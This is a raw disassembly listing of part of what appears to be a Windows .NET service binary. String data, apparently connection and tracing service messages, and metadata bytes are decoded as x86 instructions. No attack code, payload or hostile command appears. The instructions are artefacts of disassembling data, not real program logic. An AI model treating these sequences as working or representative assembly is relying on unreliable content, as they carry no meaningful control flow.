  403b2e:	imul   eax,DWORD PTR [eax],0x6e006f
  403b34:	push   ebx
  403b35:	add    BYTE PTR [ebp+0x0],ah
  403b38:	jb     0x403b3a
  403b3a:	jbe    0x403b3c
  403b3c:	imul   eax,DWORD PTR [eax],0x650063
  403b42:	and    BYTE PTR [eax],al
  403b44:	popa   
  403b45:	add    BYTE PTR [eax+eax*1+0x74],dh
  403b49:	add    BYTE PTR [ebp+0x0],ah
  403b4c:	ins    DWORD PTR es:[edi],dx
  403b4d:	add    BYTE PTR [eax+0x0],dh
  403b50:	je     0x403b52
  403b52:	and    BYTE PTR [eax],al
  403b54:	je     0x403b56
  403b56:	outs   dx,DWORD PTR ds:[esi]
  403b57:	add    BYTE PTR [eax],ah
  403b59:	add    BYTE PTR [ebx+0x0],dh
  403b5c:	je     0x403b5e
  403b5e:	popa   
  403b5f:	add    BYTE PTR [edx+0x0],dh
  403b62:	je     0x403b64
  403b64:	and    BYTE PTR [eax],al
  403b66:	je     0x403b68
  403b68:	jb     0x403b6a
  403b6a:	popa   
  403b6b:	add    BYTE PTR [ebx+0x0],ah
  403b6e:	imul   eax,DWORD PTR [eax],0x67006e
  403b74:	add    BYTE PTR cs:[eax],al
  403b77:	popa   
  403b78:	push   ebx
  403b79:	add    BYTE PTR [ebx+0x0],al
  403b7c:	outs   dx,DWORD PTR ds:[esi]
  403b7d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403b81:	add    BYTE PTR [ebp+0x0],ah
  403b84:	arpl   WORD PTR [eax],ax
  403b86:	je     0x403b88
  403b88:	imul   eax,DWORD PTR [eax],0x6e006f
  403b8e:	push   ebx
  403b8f:	add    BYTE PTR [ebp+0x0],ah
  403b92:	jb     0x403b94
  403b94:	jbe    0x403b96
  403b96:	imul   eax,DWORD PTR [eax],0x650063
  403b9c:	and    BYTE PTR [eax],al
  403b9e:	jae    0x403ba0
  403ba0:	je     0x403ba2
  403ba2:	popa   
  403ba3:	add    BYTE PTR [edx+0x0],dh
  403ba6:	je     0x403ba8
  403ba8:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  403bad:	add    BYTE PTR [eax+eax*1+0x72],dh
  403bb1:	add    BYTE PTR [ecx+0x0],ah
  403bb4:	arpl   WORD PTR [eax],ax
  403bb6:	imul   eax,DWORD PTR [eax],0x67006e
  403bbc:	and    BYTE PTR [eax],al
  403bbe:	jae    0x403bc0
  403bc0:	jne    0x403bc2
  403bc2:	arpl   WORD PTR [eax],ax
  403bc4:	arpl   WORD PTR [eax],ax
  403bc6:	add    BYTE PTR gs:[ebx+0x0],dh
  403bca:	jae    0x403bcc
  403bcc:	data16 add BYTE PTR [ebp+0x0],dh
  403bd0:	ins    BYTE PTR es:[edi],dx
  403bd1:	add    BYTE PTR [eax+eax*1+0x79],ch
  403bd5:	add    BYTE PTR [esi],ch
  403bd7:	add    BYTE PTR [eax],al
  403bd9:	arpl   WORD PTR [eax+eax*1+0x68],dx
  403bdd:	add    BYTE PTR [edx+0x0],dh
  403be0:	outs   dx,DWORD PTR ds:[esi]
  403be1:	add    BYTE PTR [edi+0x0],dh
  403be4:	imul   eax,DWORD PTR [eax],0x67006e
  403bea:	and    BYTE PTR [eax],al
  403bec:	inc    esi
  403bed:	add    BYTE PTR [ecx+0x0],ah
  403bf0:	jne    0x403bf2
  403bf2:	ins    BYTE PTR es:[edi],dx
  403bf3:	add    BYTE PTR [eax+eax*1+0x45],dh
  403bf7:	add    BYTE PTR [eax+0x0],bh
  403bfa:	arpl   WORD PTR [eax],ax
  403bfc:	add    BYTE PTR gs:[eax+0x0],dh
  403c00:	je     0x403c02
  403c02:	imul   eax,DWORD PTR [eax],0x6e006f
  403c08:	and    BYTE PTR [eax],al
  403c0a:	data16 add BYTE PTR [edi+0x0],ch
  403c0e:	jb     0x403c10
  403c10:	and    BYTE PTR [eax],al
  403c12:	inc    ebx
  403c13:	add    BYTE PTR [esi+0x0],dl
  403c16:	inc    ebx
  403c17:	add    BYTE PTR [edi+0x0],ch
  403c1a:	ins    BYTE PTR es:[edi],dx
  403c1b:	add    BYTE PTR [eax+eax*1+0x65],ch
  403c1f:	add    BYTE PTR [ebx+0x0],ah
  403c22:	je     0x403c24
  403c24:	imul   eax,DWORD PTR [eax],0x6e006f
  403c2a:	inc    ebp
  403c2b:	add    BYTE PTR [eax+0x0],bh
  403c2e:	arpl   WORD PTR [eax],ax
  403c30:	add    BYTE PTR gs:[eax+0x0],dh
  403c34:	je     0x403c36
  403c36:	imul   eax,DWORD PTR [eax],0x6e006f
  403c3c:	add    BYTE PTR [eax+0x56004399],al
  403c42:	add    BYTE PTR [ebx+0x0],al
  403c45:	outs   dx,DWORD PTR ds:[esi]
  403c46:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403c4a:	add    BYTE PTR [ebp+0x0],ah
  403c4d:	arpl   WORD PTR [eax],ax
  403c4f:	je     0x403c51
  403c51:	imul   eax,DWORD PTR [eax],0x6e006f
  403c57:	inc    ebp
  403c58:	add    BYTE PTR [eax+0x0],bh
  403c5b:	arpl   WORD PTR [eax],ax
  403c5d:	add    BYTE PTR gs:[eax+0x0],dh
  403c61:	je     0x403c63
  403c63:	imul   eax,DWORD PTR [eax],0x6e006f
  403c69:	and    BYTE PTR [eax],al
  403c6b:	outs   dx,DWORD PTR ds:[esi]
  403c6c:	add    BYTE PTR [ebx+0x0],ah
  403c6f:	arpl   WORD PTR [eax],ax
  403c71:	jne    0x403c73
  403c73:	jb     0x403c75
  403c75:	jb     0x403c77
  403c77:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  403c7c:	add    BYTE PTR [ecx+0x0],ch
  403c7f:	outs   dx,BYTE PTR ds:[esi]
  403c80:	add    BYTE PTR [eax],ah
  403c82:	add    BYTE PTR [ebx+0x0],dl
  403c85:	inc    ebx
  403c86:	add    BYTE PTR [edi+0x0],ch
  403c89:	ins    BYTE PTR es:[edi],dx
  403c8a:	add    BYTE PTR [eax+eax*1+0x65],ch
  403c8e:	add    BYTE PTR [ebx+0x0],ah
  403c91:	je     0x403c93
  403c93:	imul   eax,DWORD PTR [eax],0x6e006f
  403c99:	push   ebx
  403c9a:	add    BYTE PTR [ebp+0x0],ah
  403c9d:	jb     0x403c9f
  403c9f:	jbe    0x403ca1
  403ca1:	imul   eax,DWORD PTR [eax],0x650063
  403ca7:	and    BYTE PTR [eax],al
  403ca9:	ja     0x403cab
  403cab:	push   0x6c006900
  403cb0:	add    BYTE PTR [ebp+0x0],ah
  403cb3:	and    BYTE PTR [eax],al
  403cb5:	jae    0x403cb7
  403cb7:	je     0x403cb9
  403cb9:	popa   
  403cba:	add    BYTE PTR [edx+0x0],dh
  403cbd:	je     0x403cbf
  403cbf:	imul   eax,DWORD PTR [eax],0x67006e
  403cc5:	and    BYTE PTR [eax],al
  403cc7:	je     0x403cc9
  403cc9:	jb     0x403ccb
  403ccb:	popa   
  403ccc:	add    BYTE PTR [ebx+0x0],ah
  403ccf:	imul   eax,DWORD PTR [eax],0x67006e
  403cd5:	add    BYTE PTR cs:[eax],al
  403cd8:	dec    ebx
  403cd9:	push   esp
  403cda:	add    BYTE PTR [eax+0x0],ch
  403cdd:	jb     0x403cdf
  403cdf:	outs   dx,DWORD PTR ds:[esi]
  403ce0:	add    BYTE PTR [edi+0x0],dh
  403ce3:	imul   eax,DWORD PTR [eax],0x67006e
  403ce9:	and    BYTE PTR [eax],al
  403ceb:	inc    esi
  403cec:	add    BYTE PTR [ecx+0x0],ah
  403cef:	jne    0x403cf1
  403cf1:	ins    BYTE PTR es:[edi],dx
  403cf2:	add    BYTE PTR [eax+eax*1+0x45],dh
  403cf6:	add    BYTE PTR [eax+0x0],bh
  403cf9:	arpl   WORD PTR [eax],ax
  403cfb:	add    BYTE PTR gs:[eax+0x0],dh
  403cff:	je     0x403d01
  403d01:	imul   eax,DWORD PTR [eax],0x6e006f
  403d07:	and    BYTE PTR [eax],al
  403d09:	data16 add BYTE PTR [edi+0x0],ch
  403d0d:	jb     0x403d0f
  403d0f:	and    BYTE PTR [eax],al
  403d11:	inc    ebp
  403d12:	add    BYTE PTR [eax+0x0],bh
  403d15:	arpl   WORD PTR [eax],ax
  403d17:	add    BYTE PTR gs:[eax+0x0],dh
  403d1b:	je     0x403d1d
  403d1d:	imul   eax,DWORD PTR [eax],0x6e006f
  403d23:	add    BYTE PTR [eax+0x78004581],al
  403d29:	add    BYTE PTR [ebx+0x0],ah
  403d2c:	add    BYTE PTR gs:[eax+0x0],dh
  403d30:	je     0x403d32
  403d32:	imul   eax,DWORD PTR [eax],0x6e006f
  403d38:	and    BYTE PTR [eax],al
  403d3a:	outs   dx,DWORD PTR ds:[esi]
  403d3b:	add    BYTE PTR [ebx+0x0],ah
  403d3e:	arpl   WORD PTR [eax],ax
  403d40:	jne    0x403d42
  403d42:	jb     0x403d44
  403d44:	jb     0x403d46
  403d46:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  403d4b:	add    BYTE PTR [ecx+0x0],ch
  403d4e:	outs   dx,BYTE PTR ds:[esi]
  403d4f:	add    BYTE PTR [eax],ah
  403d51:	add    BYTE PTR [ebx+0x0],dl
  403d54:	inc    ebx
  403d55:	add    BYTE PTR [edi+0x0],ch
  403d58:	ins    BYTE PTR es:[edi],dx
  403d59:	add    BYTE PTR [eax+eax*1+0x65],ch
  403d5d:	add    BYTE PTR [ebx+0x0],ah
  403d60:	je     0x403d62
  403d62:	imul   eax,DWORD PTR [eax],0x6e006f
  403d68:	push   ebx
  403d69:	add    BYTE PTR [ebp+0x0],ah
  403d6c:	jb     0x403d6e
  403d6e:	jbe    0x403d70
  403d70:	imul   eax,DWORD PTR [eax],0x650063
  403d76:	and    BYTE PTR [eax],al
  403d78:	ja     0x403d7a
  403d7a:	push   0x6c006900
  403d7f:	add    BYTE PTR [ebp+0x0],ah
  403d82:	and    BYTE PTR [eax],al
  403d84:	jae    0x403d86
  403d86:	je     0x403d88
  403d88:	popa   
  403d89:	add    BYTE PTR [edx+0x0],dh
  403d8c:	je     0x403d8e
  403d8e:	imul   eax,DWORD PTR [eax],0x67006e
  403d94:	and    BYTE PTR [eax],al
  403d96:	je     0x403d98
  403d98:	jb     0x403d9a
  403d9a:	popa   
  403d9b:	add    BYTE PTR [ebx+0x0],ah
  403d9e:	imul   eax,DWORD PTR [eax],0x67006e
  403da4:	add    BYTE PTR cs:[eax],al
  403da7:	add    BYTE PTR [ecx+0x430053],0x6f
  403dae:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403db2:	add    BYTE PTR [ebp+0x0],ah
  403db5:	arpl   WORD PTR [eax],ax
  403db7:	je     0x403db9
  403db9:	imul   eax,DWORD PTR [eax],0x6e006f
  403dbf:	push   ebx
  403dc0:	add    BYTE PTR [ebp+0x0],ah
  403dc3:	jb     0x403dc5
  403dc5:	jbe    0x403dc7
  403dc7:	imul   eax,DWORD PTR [eax],0x650063
  403dcd:	and    BYTE PTR [eax],al
  403dcf:	jae    0x403dd1
  403dd1:	je     0x403dd3
  403dd3:	outs   dx,DWORD PTR ds:[esi]
  403dd4:	add    BYTE PTR [eax+0x0],dh
  403dd7:	and    BYTE PTR [eax],al
  403dd9:	je     0x403ddb
  403ddb:	jb     0x403ddd
  403ddd:	popa   
  403dde:	add    BYTE PTR [ebx+0x0],ah
  403de1:	imul   eax,DWORD PTR [eax],0x67006e
  403de7:	and    BYTE PTR [eax],al
  403de9:	bound  eax,QWORD PTR [eax]
  403deb:	add    BYTE PTR gs:[edi+0x0],ah
  403def:	imul   eax,DWORD PTR [eax],0x73006e
  403df5:	sub    al,0x0
  403df7:	and    BYTE PTR [eax],al
  403df9:	je     0x403dfb
  403dfb:	push   0x73006900
  403e00:	add    BYTE PTR [eax],ah
  403e02:	add    BYTE PTR [ebp+0x0],ch
  403e05:	popa   
  403e06:	add    BYTE PTR [ecx+0x0],bh
  403e09:	and    BYTE PTR [eax],al
  403e0b:	je     0x403e0d
  403e0d:	popa   
  403e0e:	add    BYTE PTR [ebx+0x0],ch
  403e11:	add    BYTE PTR gs:[eax],ah
  403e14:	add    BYTE PTR [ebx+0x0],dh
  403e17:	outs   dx,DWORD PTR ds:[esi]
  403e18:	add    BYTE PTR [ebp+0x0],ch
  403e1b:	add    BYTE PTR gs:[eax],ah
  403e1e:	add    BYTE PTR [eax+eax*1+0x69],dh
  403e22:	add    BYTE PTR [ebp+0x0],ch
  403e25:	add    BYTE PTR gs:[esi],ch
  403e28:	add    BYTE PTR [eax],al
  403e2a:	jne    0x403e7f
  403e2c:	add    BYTE PTR [ebx+0x0],al
  403e2f:	outs   dx,DWORD PTR ds:[esi]
  403e30:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403e34:	add    BYTE PTR [ebp+0x0],ah
  403e37:	arpl   WORD PTR [eax],ax
  403e39:	je     0x403e3b
  403e3b:	imul   eax,DWORD PTR [eax],0x6e006f
  403e41:	push   ebx
  403e42:	add    BYTE PTR [ebp+0x0],ah
  403e45:	jb     0x403e47
  403e47:	jbe    0x403e49
  403e49:	imul   eax,DWORD PTR [eax],0x650063
  403e4f:	and    BYTE PTR [eax],al
  403e51:	arpl   WORD PTR [eax],ax
  403e53:	outs   dx,DWORD PTR ds:[esi]
  403e54:	add    BYTE PTR [ebp+0x0],ch
  403e57:	jo     0x403e59
  403e59:	ins    BYTE PTR es:[edi],dx
  403e5a:	add    BYTE PTR [ebp+0x0],ah
  403e5d:	je     0x403e5f
  403e5f:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  403e64:	add    BYTE PTR [ebx+0x0],dl
  403e67:	je     0x403e69
  403e69:	outs   dx,DWORD PTR ds:[esi]
  403e6a:	add    BYTE PTR [eax+0x0],dh
  403e6d:	push   esp
  403e6e:	add    BYTE PTR [edx+0x0],dh
  403e71:	popa   
  403e72:	add    BYTE PTR [ebx+0x0],ah
  403e75:	imul   eax,DWORD PTR [eax],0x67006e
  403e7b:	push   esp
  403e7c:	add    BYTE PTR [ecx+0x0],ah
  403e7f:	jae    0x403e81
  403e81:	imul   eax,DWORD PTR [eax],0x20
  403e84:	add    BYTE PTR [ebx+0x0],dh
  403e87:	jne    0x403e89
  403e89:	arpl   WORD PTR [eax],ax
  403e8b:	arpl   WORD PTR [eax],ax
  403e8d:	add    BYTE PTR gs:[ebx+0x0],dh
  403e91:	jae    0x403e93
  403e93:	data16 add BYTE PTR [ebp+0x0],dh
  403e97:	ins    BYTE PTR es:[edi],dx
  403e98:	add    BYTE PTR [eax+eax*1+0x79],ch
  403e9c:	add    BYTE PTR [esi],ch
  403e9e:	add    BYTE PTR [eax],al
  403ea0:	sbb    BYTE PTR [ecx+0x560043],0x43
  403ea7:	add    BYTE PTR [edi+0x0],ch
  403eaa:	ins    BYTE PTR es:[edi],dx
  403eab:	add    BYTE PTR [eax+eax*1+0x65],ch
  403eaf:	add    BYTE PTR [ebx+0x0],ah
  403eb2:	je     0x403eb4
  403eb4:	imul   eax,DWORD PTR [eax],0x6e006f
  403eba:	inc    ebp
  403ebb:	add    BYTE PTR [eax+0x0],bh
  403ebe:	arpl   WORD PTR [eax],ax
  403ec0:	add    BYTE PTR gs:[eax+0x0],dh
  403ec4:	je     0x403ec6
  403ec6:	imul   eax,DWORD PTR [eax],0x6e006f
  403ecc:	and    BYTE PTR [eax],al
  403ece:	outs   dx,DWORD PTR ds:[esi]
  403ecf:	add    BYTE PTR [ebx+0x0],ah
  403ed2:	arpl   WORD PTR [eax],ax
  403ed4:	jne    0x403ed6
  403ed6:	jb     0x403ed8
  403ed8:	jb     0x403eda
  403eda:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  403edf:	add    BYTE PTR [ecx+0x0],ch
  403ee2:	outs   dx,BYTE PTR ds:[esi]
  403ee3:	add    BYTE PTR [eax],ah
  403ee5:	add    BYTE PTR [ebx+0x0],dl
  403ee8:	inc    ebx
  403ee9:	add    BYTE PTR [edi+0x0],ch
  403eec:	ins    BYTE PTR es:[edi],dx
  403eed:	add    BYTE PTR [eax+eax*1+0x65],ch
  403ef1:	add    BYTE PTR [ebx+0x0],ah
  403ef4:	je     0x403ef6
  403ef6:	imul   eax,DWORD PTR [eax],0x6e006f
  403efc:	push   ebx
  403efd:	add    BYTE PTR [ebp+0x0],ah
  403f00:	jb     0x403f02
  403f02:	jbe    0x403f04
  403f04:	imul   eax,DWORD PTR [eax],0x650063
  403f0a:	and    BYTE PTR [eax],al
  403f0c:	ja     0x403f0e
  403f0e:	push   0x6c006900
  403f13:	add    BYTE PTR [ebp+0x0],ah
  403f16:	and    BYTE PTR [eax],al
  403f18:	jae    0x403f1a
  403f1a:	je     0x403f1c
  403f1c:	outs   dx,DWORD PTR ds:[esi]
  403f1d:	add    BYTE PTR [eax+0x0],dh
  403f20:	jo     0x403f22
  403f22:	imul   eax,DWORD PTR [eax],0x67006e
  403f28:	and    BYTE PTR [eax],al
  403f2a:	je     0x403f2c
  403f2c:	jb     0x403f2e
  403f2e:	popa   
  403f2f:	add    BYTE PTR [ebx+0x0],ah
  403f32:	imul   eax,DWORD PTR [eax],0x67006e
  403f38:	add    BYTE PTR cs:[eax],al
  403f3b:	sbb    BYTE PTR [ebx+0x780045],0x63
  403f42:	add    BYTE PTR [ebp+0x0],ah
  403f45:	jo     0x403f47
  403f47:	je     0x403f49
  403f49:	imul   eax,DWORD PTR [eax],0x6e006f
  403f4f:	and    BYTE PTR [eax],al
  403f51:	outs   dx,DWORD PTR ds:[esi]
  403f52:	add    BYTE PTR [ebx+0x0],ah
  403f55:	arpl   WORD PTR [eax],ax
  403f57:	jne    0x403f59
  403f59:	jb     0x403f5b
  403f5b:	jb     0x403f5d
  403f5d:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  403f62:	add    BYTE PTR [ecx+0x0],ch
  403f65:	outs   dx,BYTE PTR ds:[esi]
  403f66:	add    BYTE PTR [eax],ah
  403f68:	add    BYTE PTR [ebx+0x0],dl
  403f6b:	inc    ebx
  403f6c:	add    BYTE PTR [edi+0x0],ch
  403f6f:	ins    BYTE PTR es:[edi],dx
  403f70:	add    BYTE PTR [eax+eax*1+0x65],ch
  403f74:	add    BYTE PTR [ebx+0x0],ah
  403f77:	je     0x403f79
  403f79:	imul   eax,DWORD PTR [eax],0x6e006f
  403f7f:	push   ebx
  403f80:	add    BYTE PTR [ebp+0x0],ah
  403f83:	jb     0x403f85
  403f85:	jbe    0x403f87
  403f87:	imul   eax,DWORD PTR [eax],0x650063
  403f8d:	cmp    al,BYTE PTR [eax]
  403f8f:	cmp    al,BYTE PTR [eax]
  403f91:	push   ebx
  403f92:	add    BYTE PTR [eax+eax*1+0x6f],dh
  403f96:	add    BYTE PTR [eax+0x0],dh
  403f99:	push   esp
  403f9a:	add    BYTE PTR [edx+0x0],dh
  403f9d:	popa   
  403f9e:	add    BYTE PTR [ebx+0x0],ah
  403fa1:	imul   eax,DWORD PTR [eax],0x67006e
  403fa7:	and    BYTE PTR [eax],al
  403fa9:	ja     0x403fab
  403fab:	push   0x6c006900
  403fb0:	add    BYTE PTR [ebp+0x0],ah
  403fb3:	and    BYTE PTR [eax],al
  403fb5:	jae    0x403fb7
  403fb7:	je     0x403fb9
  403fb9:	outs   dx,DWORD PTR ds:[esi]
  403fba:	add    BYTE PTR [eax+0x0],dh
  403fbd:	jo     0x403fbf
  403fbf:	imul   eax,DWORD PTR [eax],0x67006e
  403fc5:	and    BYTE PTR [eax],al
  403fc7:	je     0x403fc9
  403fc9:	jb     0x403fcb
  403fcb:	popa   
  403fcc:	add    BYTE PTR [ebx+0x0],ah
  403fcf:	imul   eax,DWORD PTR [eax],0x67006e
  403fd5:	add    BYTE PTR cs:[eax],al
  403fd8:	addr16 push ebx
  403fda:	add    BYTE PTR [ebx+0x0],al
  403fdd:	outs   dx,DWORD PTR ds:[esi]
  403fde:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403fe2:	add    BYTE PTR [ebp+0x0],ah
  403fe5:	arpl   WORD PTR [eax],ax
  403fe7:	je     0x403fe9
  403fe9:	imul   eax,DWORD PTR [eax],0x6e006f
  403fef:	push   ebx
  403ff0:	add    BYTE PTR [ebp+0x0],ah
  403ff3:	jb     0x403ff5
  403ff5:	jbe    0x403ff7
  403ff7:	imul   eax,DWORD PTR [eax],0x650063
  403ffd:	and    BYTE PTR [eax],al
  403fff:	je     0x404001
  404001:	jb     0x404003
  404003:	jns    0x404005
  404005:	imul   eax,DWORD PTR [eax],0x67006e
  40400b:	and    BYTE PTR [eax],al
  40400d:	je     0x40400f
  40400f:	outs   dx,DWORD PTR ds:[esi]
  404010:	add    BYTE PTR [eax],ah
  404012:	add    BYTE PTR [eax+eax*1+0x69],al
  404016:	add    BYTE PTR [ebx+0x0],dh
  404019:	popa   
  40401a:	add    BYTE PTR [edx+0x0],ah
  40401d:	ins    BYTE PTR es:[edi],dx
  40401e:	add    BYTE PTR [ebp+0x0],ah
  404021:	inc    ebp
  404022:	add    BYTE PTR [eax+0x0],bh
  404025:	add    BYTE PTR gs:[ebx+0x0],ah
  404029:	jne    0x40402b
  40402b:	je     0x40402d
  40402d:	imul   eax,DWORD PTR [eax],0x650076
  404033:	push   eax
  404034:	add    BYTE PTR [ecx+0x0],ah
  404037:	add    BYTE PTR [bx+di+0x0],ch
  40403b:	outs   dx,BYTE PTR ds:[esi]
  40403c:	add    BYTE PTR [edi+0x0],ah
  40403f:	add    BYTE PTR [ebx+0x55],ah
  404042:	add    BYTE PTR [esi+0x0],ch
  404045:	popa   
  404046:	add    BYTE PTR [edx+0x0],ah
  404049:	ins    BYTE PTR es:[edi],dx
  40404a:	add    BYTE PTR [ebp+0x0],ah
  40404d:	and    BYTE PTR [eax],al
  40404f:	je     0x404051
  404051:	outs   dx,DWORD PTR ds:[esi]
  404052:	add    BYTE PTR [eax],ah
  404054:	add    BYTE PTR [edi+0x0],ah
  404057:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  40405c:	add    BYTE PTR [eax+eax*1+0x68],dh
  404060:	add    BYTE PTR [ebp+0x0],ah
  404063:	and    BYTE PTR [eax],al
  404065:	ins    DWORD PTR es:[edi],dx
  404066:	add    BYTE PTR [ecx+0x0],ah
  404069:	imul   eax,DWORD PTR [eax],0x20006e
  40406f:	ins    DWORD PTR es:[edi],dx
  404070:	add    BYTE PTR [edi+0x0],ch
  404073:	add    BYTE PTR fs:[ebp+0x0],dh
  404077:	ins    BYTE PTR es:[edi],dx
  404078:	add    BYTE PTR [ebp+0x0],ah
  40407b:	and    BYTE PTR [eax],al
  40407d:	data16 add BYTE PTR [edi+0x0],ch
  404081:	jb     0x404083
  404083:	and    BYTE PTR [eax],al
  404085:	je     0x404087
  404087:	push   0x20006500
  40408c:	add    BYTE PTR [eax+0x0],dh
  40408f:	jb     0x404091
  404091:	outs   dx,DWORD PTR ds:[esi]
  404092:	add    BYTE PTR [ebx+0x0],ah
  404095:	add    BYTE PTR gs:[ebx+0x0],dh
  404099:	jae    0x40409b
  40409b:	and    BYTE PTR [eax],al
  40409d:	dec    ecx
  40409e:	add    BYTE PTR [eax+eax*1+0x20],ah
  4040a2:	add    BYTE PTR [eax],al
  4040a4:	test   DWORD PTR [ebp+0x52],esp
  4040a7:	sbb    DWORD PTR [esi],esp
  4040a9:	mov    ebx,0xae8446c4
  4040ae:	out    0x88,eax
  4040b0:	push   0xaed984
  4040b5:	or     BYTE PTR [edi+0x19565c7a],dh
  4040bb:	xor    al,0xe0
  4040bd:	mov    DWORD PTR [eax],ecx
  4040bf:	mov    al,0x3f
  4040c1:	pop    edi
  4040c2:	jg     0x4040d5
  4040c4:	aad    0xa
  4040c6:	cmp    al,BYTE PTR [edx]
  4040c8:	push   es
  4040c9:	add    al,BYTE PTR [ebx]
  4040cb:	push   es
  4040cc:	adc    DWORD PTR ds:0x11120603,ecx
  4040d2:	add    eax,DWORD PTR [esi]
  4040d4:	adc    dl,BYTE PTR ds:0x8010005
  4040da:	sbb    eax,0x40e
  4040df:	adc    bl,BYTE PTR [ecx]
  4040e1:	add    eax,0x1d020100
  4040e6:	push   cs
  4040e7:	add    esp,DWORD PTR [eax]
  4040e9:	add    BYTE PTR [ecx],al
  4040eb:	push   es
  4040ec:	push   es
  4040ed:	adc    eax,0x2011d12
  4040f2:	add    al,0x20
  4040f4:	add    BYTE PTR [edx],dl
  4040f6:	and    DWORD PTR [eax+eiz*1],eax
  4040f9:	add    BYTE PTR [ecx],dl
  4040fb:	and    eax,0x1205200c
  404100:	sub    DWORD PTR [edx],edx
  404102:	sub    eax,0x31120e0e
  404107:	adc    dh,BYTE PTR [ecx]
  404109:	add    al,0x20
  40410b:	add    BYTE PTR [edx],dl
  40410d:	xor    eax,0x2002003
  404112:	push   es
  404113:	and    BYTE PTR [ebx],al
  404115:	add    DWORD PTR [esi],ecx
  404117:	push   cs
  404118:	push   cs
  404119:	add    al,0x20
  40411b:	add    DWORD PTR [esi],ecx
  40411d:	or     BYTE PTR [eax+ebp*1],al
  404120:	add    BYTE PTR [edx],dl
  404122:	and    DWORD PTR [eax+eiz*1],eax
  404125:	add    DWORD PTR [ecx],eax
  404127:	push   cs
  404128:	add    al,0x20
  40412a:	add    DWORD PTR [ecx],eax
  40412c:	add    al,BYTE PTR ds:0xe010220
  404132:	push   cs
  404133:	push   es
  404134:	and    BYTE PTR [ecx],al
  404136:	add    DWORD PTR [ecx],edx
  404138:	add    BYTE PTR [ebp+0x1012004],0x8
  40413f:	and    BYTE PTR [eax+0x2400],0x4
  404146:	add    BYTE PTR [eax],0x0
  404149:	xchg   esp,eax
  40414a:	add    BYTE PTR [eax],al
  40414c:	add    BYTE PTR [esi],al
  40414e:	add    al,BYTE PTR [eax]
  404150:	add    BYTE PTR [eax],al
  404152:	and    al,0x0
  404154:	add    BYTE PTR [edx+0x53],dl
  404157:	inc    ecx
  404158:	xor    DWORD PTR [eax],eax
  40415a:	add    al,0x0
  40415c:	add    BYTE PTR [ecx],al
  40415e:	add    BYTE PTR [ecx],al
  404160:	add    BYTE PTR [edi],al
  404162:	sar    edx,1
  404164:	push   edi
  404165:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  40416b:	test   BYTE PTR [edx+0xdfdae0f],ch
  404171:	jmp    0xecab3f5e
  404176:	pop    DWORD PTR [edi+0x6c7603fb]
  40417c:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  404181:	mov    dl,0x3b
  404183:	out    0x9a,eax
  404185:	(bad)  
  404187:	fadd   st(1),st
  404189:	fstp   QWORD PTR [edx+0x211336d2]
  40418f:	add    dl,BYTE PTR [eax-0x6c38df5]
  404195:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  40419c:	pop    esi
  40419e:	pop    es
  40419f:	ja     0x4041f0
  4041a1:	sub    eax,ebp
  4041a3:	xor    cl,BYTE PTR [esi]
  4041a5:	xchg   edx,eax
  4041a6:	jmp    0xc021:0xe8e4ec05
  4041ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ae:	out    dx,eax
  4041af:	call   0x4c9ca6a5
  4041b4:	or     al,0x93
  4041b6:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  4041bd:	stos   BYTE PTR es:[edi],al
  4041be:	gs sub al,0x1d
  4041c1:	cli    
  4041c2:	(bad)  
  4041c3:	cmp    eax,0x2d6f5d74
  4041c8:	in     eax,0xf1
  4041ca:	jle    0x40422a
  4041cc:	scas   eax,DWORD PTR es:[edi]
  4041cd:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  4041d5:	inc    ebx
  4041d6:	sbb    BYTE PTR gs:[eax],ah
  4041d9:	ins    DWORD PTR es:[edi],dx
  4041da:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  4041e1:	add    al,0x0
  4041e3:	add    DWORD PTR [ecx],eax
  4041e5:	or     BYTE PTR [edi],al
  4041e7:	and    BYTE PTR [edx],al
  4041e9:	add    DWORD PTR [ebx*1+0x6041912],ebx
  4041f0:	adc    DWORD PTR [eax+0x1200699],eax
  4041f6:	add    DWORD PTR [ecx],edx
  4041f8:	sbb    BYTE PTR [ecx+0x12010008],0x80
  4041ff:	mov    eax,ds:0xca58011
  404204:	and    BYTE PTR [ebx],al
  404206:	adc    al,BYTE PTR [eax-0x5e7fed57]
  40420c:	adc    al,BYTE PTR [eax+0x20050e9d]
  404212:	add    BYTE PTR [edx],dl
  404214:	xor    BYTE PTR [ecx+0x1012005],0x12
  40421b:	adc    eax,0x1012006
  404220:	adc    al,BYTE PTR [eax+0x10005b9]
  404226:	add    DWORD PTR [ecx],edx
  404228:	or     eax,0x12000005
  40422d:	add    ch,0x5
  404230:	and    BYTE PTR [edx],al
  404232:	add    DWORD PTR [eax+ebx*1],ebx
  404235:	pop    es
  404236:	and    BYTE PTR [ecx],al
  404238:	adc    ah,BYTE PTR [ecx]
  40423a:	adc    al,BYTE PTR [eax+0x10006c9]
  404240:	or     BYTE PTR ds:0x62112,bl
  404246:	add    DWORD PTR [ecx],eax
  404248:	adc    al,BYTE PTR [eax+0x20007d5]
  40424e:	add    DWORD PTR [edx],edx
  404250:	adc    ch,0xe
  404253:	sbb    eax,0xc120a07
  404258:	adc    al,BYTE PTR [eax-0x6a7fed6f]
  40425e:	adc    al,BYTE PTR [eax-0x267fed6b]
  404264:	adc    al,BYTE PTR [eax-0x2a7fed23]
  40426a:	or     BYTE PTR ds:0x121d1912,bl
  404270:	and    DWORD PTR ds:0x80120000,eax
  404276:	loope  0x40427c
  404278:	and    BYTE PTR [ecx],al
  40427a:	push   cs
  40427b:	push   cs
  40427c:	or     DWORD PTR [eax],eax
  40427e:	add    ecx,DWORD PTR [esi]
  404280:	adc    al,BYTE PTR [eax+0x1c1d0ee9]
  404286:	pop    es
